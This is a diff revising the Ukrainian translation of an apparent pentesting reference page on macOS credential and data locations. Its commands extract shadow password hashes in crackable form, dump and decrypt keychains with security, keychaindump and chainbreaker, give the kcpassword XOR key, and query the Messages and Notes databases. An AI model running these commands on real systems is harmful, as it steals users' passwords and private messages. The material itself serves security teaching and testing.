@@ -7,7 +7,7 @@
 ### Тіньові Паролі
 
 Тіньовий пароль зберігається з конфігурацією користувача в plists, розташованих у **`/var/db/dslocal/nodes/Default/users/`**.\
-Наступний однорядковий код можна використовувати для виведення **всієї інформації про користувачів** (включаючи інформацію про хеш):
+Наступний однорядковий код можна використовувати для вивантаження **всіх відомостей про користувачів** (включаючи інформацію про хеш):
 ```bash
 for l in /var/db/dslocal/nodes/Default/users/*; do if [ -r "$l" ];then echo "$l"; defaults read "$l"; fi; done
 ```
@@ -17,15 +17,15 @@ for l in /var/db/dslocal/nodes/Default/users/*; do if [ -r "$l" ];then echo "$l"
 ```bash
 sudo bash -c 'for i in $(find /var/db/dslocal/nodes/Default/users -type f -regex "[^_]*"); do plutil -extract name.0 raw $i | awk "{printf \$0\":\$ml\$\"}"; for j in {iterations,salt,entropy}; do l=$(k=$(plutil -extract ShadowHashData.0 raw $i) && base64 -d <<< $k | plutil -extract SALTED-SHA512-PBKDF2.$j raw -); if [[ $j == iterations ]]; then echo -n $l; else base64 -d <<< $l | xxd -p -c 0 | awk "{printf \"$\"\$0}"; fi; done; echo ""; done'
 ```
-Інший спосіб отримати `ShadowHashData` користувача - це використання `dscl`: `` sudo dscl . -read /Users/`whoami` ShadowHashData ``
+Ще один спосіб отримати `ShadowHashData` користувача - це використання `dscl`: `` sudo dscl . -read /Users/`whoami` ShadowHashData ``
 
 ### /etc/master.passwd
 
 Цей файл **використовується тільки** коли система працює в **однокористувацькому режимі** (тому не дуже часто).
 
-### Вивантаження ключів
+### Keychain Dump
 
-Зверніть увагу, що при використанні бінарного файлу безпеки для **вивантаження розшифрованих паролів**, кілька запитів попросять користувача дозволити цю операцію.
+Зверніть увагу, що при використанні бінарного файлу security для **вивантаження розшифрованих паролів**, кілька запитів попросять користувача дозволити цю операцію.
 ```bash
 #security
 security dump-trust-settings [-s] [-d] #List certificates
@@ -43,11 +43,11 @@ security dump-keychain -d #Dump all the info, included secrets (the user will be
 
 Інструмент під назвою **keychaindump** був розроблений для витягування паролів з ключниць macOS, але він стикається з обмеженнями на новіших версіях macOS, таких як Big Sur, як зазначено в [обговоренні](https://github.com/juuso/keychaindump/issues/10#issuecomment-751218760). Використання **keychaindump** вимагає від атакуючого отримати доступ і підвищити привілеї до **root**. Інструмент використовує той факт, що ключниця за замовчуванням розблокована під час входу користувача для зручності, що дозволяє додаткам отримувати до неї доступ без повторного введення пароля користувача. Однак, якщо користувач вирішить заблокувати свою ключницю після кожного використання, **keychaindump** стає неефективним.
 
-**Keychaindump** працює, націлюючись на конкретний процес під назвою **securityd**, який Apple описує як демон для авторизації та криптографічних операцій, що є критично важливим для доступу до ключниці. Процес витягування включає в себе ідентифікацію **Master Key**, отриманого з пароля для входу користувача. Цей ключ є необхідним для читання файлу ключниці. Щоб знайти **Master Key**, **keychaindump** сканує купу пам'яті **securityd** за допомогою команди `vmmap`, шукаючи потенційні ключі в областях, позначених як `MALLOC_TINY`. Для перевірки цих областей пам'яті використовується наступна команда:
+**Keychaindump** працює, націлюючись на конкретний процес під назвою **securityd**, який Apple описує як демон для авторизації та криптографічних операцій, що є критично важливим для доступу до ключниці. Процес витягування включає в себе ідентифікацію **Master Key**, отриманого з пароля для входу користувача. Цей ключ є необхідним для читання файлу ключниці. Щоб знайти **Master Key**, **keychaindump** сканує купу пам'яті **securityd** за допомогою команди `vmmap`, шукаючи потенційні ключі в областях, позначених як `MALLOC_TINY`. Для перевірки цих пам'яткових місць використовується наступна команда:
 ```bash
 sudo vmmap <securityd PID> | grep MALLOC_TINY
 ```
-Після ідентифікації потенційних майстер-ключів, **keychaindump** шукає в купах певний шаблон (`0x0000000000000018`), який вказує на кандидата для майстер-ключа. Додаткові кроки, включаючи деобфускацію, необхідні для використання цього ключа, як зазначено в вихідному коді **keychaindump**. Аналітики, які зосереджуються на цій області, повинні звернути увагу на те, що критичні дані для розшифровки ключа зберігаються в пам'яті процесу **securityd**. Приклад команди для запуску **keychaindump**:
+Після ідентифікації потенційних майстер-ключів, **keychaindump** шукає в купах певний шаблон (`0x0000000000000018`), який вказує на кандидата для майстер-ключа. Подальші кроки, включаючи деобфускацію, необхідні для використання цього ключа, як зазначено в вихідному коді **keychaindump**. Аналітики, які зосереджуються на цій області, повинні звернути увагу на те, що критичні дані для розшифровки ключа зберігаються в пам'яті процесу **securityd**. Приклад команди для запуску **keychaindump**:
 ```bash
 sudo ./keychaindump
 ```
@@ -60,20 +60,20 @@ sudo ./keychaindump
 - Загальні паролі
 - Приватні ключі
 - Публічні ключі
-- Сертифікати X509
+- X509 сертифікати
 - Захищені нотатки
 - Паролі Appleshare
 
-Знаючи пароль для розблокування ключниці, майстер-ключ, отриманий за допомогою [volafox](https://github.com/n0fate/volafox) або [volatility](https://github.com/volatilityfoundation/volatility), або файл розблокування, такий як SystemKey, Chainbreaker також надасть паролі у відкритому вигляді.
+Зважаючи на пароль для розблокування ключниці, майстер-ключ, отриманий за допомогою [volafox](https://github.com/n0fate/volafox) або [volatility](https://github.com/volatilityfoundation/volatility), або файл розблокування, такий як SystemKey, Chainbreaker також надасть паролі у відкритому вигляді.
 
-Без одного з цих методів розблокування ключниці Chainbreaker відобразить всю іншу доступну інформацію.
+Без одного з цих методів розблокування ключниці, Chainbreaker відобразить всю іншу доступну інформацію.
 
 #### **Dump keychain keys**
 ```bash
 #Dump all keys of the keychain (without the passwords)
 python2.7 chainbreaker.py --dump-all /Library/Keychains/System.keychain
 ```
-#### **Вивантаження ключів ключниці (з паролями) за допомогою SystemKey**
+#### **Вивантажити ключі ключниці (з паролями) за допомогою SystemKey**
 ```bash
 # First, get the keychain decryption key
 # To get this decryption key you need to be root and SIP must be disabled
@@ -92,7 +92,7 @@ python2.7 chainbreaker.py --dump-all --key 0293847570022761234562947e0bcd5bc04d1
 ```
 #### **Витягти ключі з ключниці (з паролями) за допомогою дампу пам'яті**
 
-[Слідуйте цим крокам](../#dumping-memory-with-osxpmem), щоб виконати **дамп пам'яті**
+[Слідуйте цим крокам](../index.html#dumping-memory-with-osxpmem), щоб виконати **дамп пам'яті**
 ```bash
 #Use volafox (https://github.com/n0fate/volafox) to extract possible keychain passwords
 # Unformtunately volafox isn't working with the latest versions of MacOS
@@ -101,19 +101,19 @@ python vol.py -i ~/Desktop/show/macosxml.mem -o keychaindump
 #Try to extract the passwords using the extracted keychain passwords
 python2.7 chainbreaker.py --dump-all --key 0293847570022761234562947e0bcd5bc04d196ad2345697 /Library/Keychains/System.keychain
 ```
-#### **Вивантаження ключів ключниці (з паролями) за допомогою пароля користувача**
+#### **Вивантажити ключі з ключниці (з паролями), використовуючи пароль користувача**
 
-Якщо ви знаєте пароль користувача, ви можете використовувати його для **вивантаження та розшифрування ключниць, що належать користувачу**.
+Якщо ви знаєте пароль користувача, ви можете використовувати його для **вивантаження та розшифровки ключниць, що належать користувачу**.
 ```bash
 #Prompt to ask for the password
 python2.7 chainbreaker.py --dump-all --password-prompt /Users/<username>/Library/Keychains/login.keychain-db
 ```
 ### kcpassword
 
-Файл **kcpassword** - це файл, який містить **пароль для входу користувача**, але тільки якщо власник системи **увімкнув автоматичний вхід**. Тому користувач буде автоматично увійдений без запиту пароля (що не є дуже безпечним).
+Файл **kcpassword** - це файл, який містить **пароль для входу користувача**, але тільки якщо власник системи **увімкнув автоматичний вхід**. Тому користувач буде автоматично увійти без запиту пароля (що не є дуже безпечним).
 
 Пароль зберігається у файлі **`/etc/kcpassword`** xored з ключем **`0x7D 0x89 0x52 0x23 0xD2 0xBC 0xDD 0xEA 0xA3 0xB9 0x1F`**. Якщо пароль користувача довший за ключ, ключ буде повторно використано.\
-Це робить пароль досить легким для відновлення, наприклад, за допомогою скриптів, як [**цей**](https://gist.github.com/opshope/32f65875d45215c3677d).
+Це робить пароль досить простим для відновлення, наприклад, за допомогою скриптів, як [**цей**](https://gist.github.com/opshope/32f65875d45215c3677d).
 
 ## Цікава інформація в базах даних
 
@@ -125,9 +125,9 @@ sqlite3 $HOME/Library/Messages/chat.db 'select * from attachment'
 sqlite3 $HOME/Library/Messages/chat.db 'select * from deleted_messages'
 sqlite3 $HOME/Suggestions/snippets.db 'select * from emailSnippets'
 ```
-### Сповіщення
+### Notifications
 
-Ви можете знайти дані Сповіщень у `$(getconf DARWIN_USER_DIR)/com.apple.notificationcenter/`
+Ви можете знайти дані сповіщень у `$(getconf DARWIN_USER_DIR)/com.apple.notificationcenter/`
 
 Більшість цікавої інформації буде в **blob**. Тому вам потрібно буде **витягнути** цей вміст і **перетворити** його на **людську** **читабельність** або використати **`strings`**. Щоб отримати доступ, ви можете зробити:
 ```bash
@@ -143,13 +143,13 @@ sqlite3 ~/Library/Group\ Containers/group.com.apple.notes/NoteStore.sqlite .tabl
 #To dump it in a readable format:
 for i in $(sqlite3 ~/Library/Group\ Containers/group.com.apple.notes/NoteStore.sqlite "select Z_PK from ZICNOTEDATA;"); do sqlite3 ~/Library/Group\ Containers/group.com.apple.notes/NoteStore.sqlite "select writefile('body1.gz.z', ZDATA) from ZICNOTEDATA where Z_PK = '$i';"; zcat body1.gz.Z ; done
 ```
-## Налаштування
+## Preferences
 
-У macOS налаштування програм знаходяться в **`$HOME/Library/Preferences`**, а в iOS вони знаходяться в `/var/mobile/Containers/Data/Application/<UUID>/Library/Preferences`.
+В macOS налаштування розташовані в **`$HOME/Library/Preferences`**, а в iOS вони знаходяться в `/var/mobile/Containers/Data/Application/<UUID>/Library/Preferences`.
 
-У macOS інструмент командного рядка **`defaults`** можна використовувати для **зміни файлу налаштувань**.
+В macOS інструмент командного рядка **`defaults`** може бути використаний для **модифікації файлу налаштувань**.
 
-**`/usr/sbin/cfprefsd`** заявляє про XPC сервіси `com.apple.cfprefsd.daemon` та `com.apple.cfprefsd.agent` і може бути викликаний для виконання дій, таких як зміна налаштувань.
+**`/usr/sbin/cfprefsd`** заявляє про XPC сервіси `com.apple.cfprefsd.daemon` та `com.apple.cfprefsd.agent` і може бути викликаний для виконання дій, таких як модифікація налаштувань.
 
 ## OpenDirectory permissions.plist
 
@@ -191,7 +191,7 @@ for i in $(sqlite3 ~/Library/Group\ Containers/group.com.apple.notes/NoteStore.s
 
 ### Сповіщення Darwin
 
-Головний демон для сповіщень - **`/usr/sbin/notifyd`**. Щоб отримувати сповіщення, клієнти повинні зареєструватися через Mach-порт `com.apple.system.notification_center` (перевірте їх за допомогою `sudo lsmp -p <pid notifyd>`). Демон налаштовується за допомогою файлу `/etc/notify.conf`.
+Головний демон для сповіщень - **`/usr/sbin/notifyd`**. Щоб отримувати сповіщення, клієнти повинні зареєструватися через Mach порт `com.apple.system.notification_center` (перевірте їх за допомогою `sudo lsmp -p <pid notifyd>`). Демон налаштовується за допомогою файлу `/etc/notify.conf`.
 
 Імена, що використовуються для сповіщень, є унікальними зворотними DNS-нотаціями, і коли сповіщення надсилається одному з них, клієнти, які вказали, що можуть його обробити, отримають його.
 
@@ -236,6 +236,6 @@ sudo sqlite3 /Library/Application\ Support/ApplePushService/aps.db
 
 - **`CFUserNotification`**: Цей API надає спосіб показати на екрані спливаюче вікно з повідомленням.
 - **Дошка оголошень**: Це показує в iOS банер, який зникає і буде збережений у Центрі сповіщень.
-- **`NSUserNotificationCenter`**: Це дошка оголошень iOS в MacOS. База даних зі сповіщеннями знаходиться в `/var/folders/<user temp>/0/com.apple.notificationcenter/db2/db`
+- **`NSUserNotificationCenter`**: Це дошка оголошень iOS у MacOS. База даних зі сповіщеннями знаходиться в `/var/folders/<user temp>/0/com.apple.notificationcenter/db2/db`
 
 {{#include ../../../banners/hacktricks-training.md}}
